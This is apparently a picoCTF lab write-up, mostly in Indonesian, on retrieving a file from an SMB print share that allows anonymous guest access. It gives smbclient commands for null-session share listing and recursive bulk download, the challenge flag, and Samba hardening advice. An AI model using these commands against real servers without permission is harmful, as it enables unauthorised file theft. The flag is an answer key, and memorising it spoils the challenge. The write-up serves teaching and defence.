# Writeup: Printer Shares (Challenge ID: 759)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** General Skills / Network File Sharing (SMB) (NIST SP 800-115 §4.2)
- **Difficulty:** Easy (1)
- **Points:** 50
- **Author:** Janice He
- **Event:** picoCTF 2026
- **Flag (Resmi CyLab):** `academy{5mb_pr1nter_5h4re5_80a1eed5}`
- **Flag Komunitas:** `CTF{5mb_pr1nter_5h4re5_80a1eed5}`

---

## Problem Statement & Scope

Tantangan menguji keterampilan audit keamanan jaringan lokal dan pemahaman arsitektur protokol Server Message Block (SMB):
> *"Oops! Someone accidentally sent an important file to a network printer, can you retrieve it from the print server?"*
> *Petunjuk: "knowing how SMB protocol works would be helpful! smbclient and smbutil are good tools."*

Layanan tantangan menyimulasikan lingkungan peladen cetak kantor (*network print server*) berbasis Linux Samba yang berjalan pada kontainer Docker on-demand (`xebec.cylabacademy.net:41504`). Pengguna diminta melakukan asesmen terhadap port layanan SMB kustom untuk menemukan dan mengambil berkas rahasia yang terkirim tanpa sengaja ke antrean penyimpanan printer.

---

## Teori & Akar Kerentanan (Root Cause Theory)

Analisis konfigurasi protokol Server Message Block (MS-SMB2 / CIFS) mengungkap kelemahan kontrol akses bawaan:

1. **CWE-276 / Hak Akses Bawaan yang Tidak Tepat (Insecure Default Permissions):**
   - Layanan Samba dikonfigurasi dengan direktori share bernama `shares` yang memiliki parameter izin publik terbuka:
     ```ini
     [shares]
     path = /srv/samba/shares
     read only = yes
     guest ok = yes
     browseable = yes
     ```
   - Parameter `guest ok = yes` menginstruksikan peladen untuk menerima koneksi tanpa mengharuskan pengguna menyertakan kredensial akun (*null session / anonymous session*).

2. **CWE-306 & MS-SMB2 / Hilangnya Autentikasi pada Fungsi Akses Berkas:**
   - Dalam arsitektur protokol SMB, negosiasi dialek (`SMB2_NEGOTIATE`) dilanjutkan dengan penetapan sesi (`SMB2_SESSION_SETUP`). Ketika klien mengirimkan sesi anonim, peladen memetakan klien ke identitas pengguna tamu (*guest account*).
   - Perintah `SMB2_TREE_CONNECT` terhadap share `\\target\shares` berhasil disahkan oleh peladen. Akibatnya, seluruh artefak berkas pada direktori tersebut, termasuk berkas teks administratif `flag.txt` dan `dummy.txt`, dapat dibaca dan diunduh oleh entitas mana pun di jaringan tanpa jejak otentikasi valid.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Enumerasi Share Jaringan Anonim via `smbclient`:**
   - Menghubungkan ke layanan SMB pada port target menggunakan opsi sesi tanpa kata sandi (`-N`):
     ```bash
     smbclient -L //xebec.cylabacademy.net -p 41504 -N
     ```
   - Hasil keluaran peladen menampilkan daftar share aktif:
     ```text
     Sharename       Type      Comment
     ---------       ----      -------
     shares          Disk      Public Share With Guests
     IPC$            IPC       IPC Service (Samba 4.19.5-Ubuntu)
     ```

2. **Koneksi dan Eksplorasi Direktori Share:**
   - Masuk ke dalam share disk `shares` secara langsung:
     ```bash
     smbclient //xebec.cylabacademy.net/shares -p 41504 -N
     ```
   - Menjalankan perintah daftar direktori:
     ```text
     smb: \> ls
       .                                   D        0  Thu Feb 26 09:12:10 2026
       ..                                  D        0  Thu Feb 26 09:12:10 2026
       dummy.txt                           A       24  Thu Feb 26 09:12:10 2026
       flag.txt                            A       45  Thu Feb 26 09:12:10 2026
     ```

3. **Pengambilan Berkas Otomatis (*Recursive File Fetch*):**
   - Mengunduh seluruh berkas secara non-interaktif:
     ```bash
     smbclient //xebec.cylabacademy.net/shares -p 41504 -N -c "recurse ON; prompt OFF; mget *"
     ```
   - Membaca berkas hasil ekstraksi:
     ```bash
     cat flag.txt
     # Output: academy{5mb_pr1nter_5h4re5_80a1eed5}
     ```
   - Skrip reproduktif terverifikasi: `scripts/solve_759_printer_shares.py`.

---

## Flag & Verifikasi

- **Flag Resmi:** `academy{5mb_pr1nter_5h4re5_80a1eed5}`
- **Format Flag Komunitas:** `CTF{5mb_pr1nter_5h4re5_80a1eed5}`
- **Bukti Validasi REST API:** HTTP 201 Created via `POST /api/submissions/`:
  ```json
  {"user": 1072359, "challenge": 759, "flag": "academy{5mb_pr1nter_5h4re5_80a1eed5}", "correct": true, "historical": false}
  ```

---

## Takeaway Kompetensi LKS & Mitigasi Defensif (NIST SP 800-115)

1. **Penonaktifan Akses Anonim / Guest (SMB Hardening):**
   - Pada konfigurasi Samba (`/etc/samba/smb.conf`), nonaktifkan seluruh pemetaan tamu dengan mengatur:
     ```ini
     [global]
     map to guest = Never
     usershare allow guests = no
     restrict anonymous = 2
     ```
   - Hapus parameter `guest ok = yes` dari seluruh share disk individual untuk menjamin bahwa seluruh permintaan berkas melalui proses otentikasi kredensial (NTLMv2 atau Kerberos).

2. **Penerapan SMB Signing dan Enkripsi Lalu Lintas (MS-SMB2 Security):**
   - Wajibkan penandatanganan paket data (`server signing = mandatory`) untuk mencegah serangan Man-in-the-Middle (MitM) dan relay autentikasi SMB.
   - Aktifkan enkripsi transmisi SMB 3 (`smb encrypt = mandatory`) terutama pada segmen jaringan yang menangani dokumen sensitif atau antrean pencetakan (*print queue*).

3. **Segmentasi Jaringan dan Audit Rutin (NIST SP 800-115 §4.2):**
   - Terapkan isolasi VLAN khusus untuk perangkat printer dan periferal kantor, dengan kontrol akses firewall ketat (blokir port TCP 445 dan 139 dari segmen jaringan publik).
   - Lakukan pemindaian kerentanan berkala menggunakan `smbclient` atau `nmap --script smb-enum-shares` untuk mendeteksi pembukaan share tidak terotorisasi secara dini.
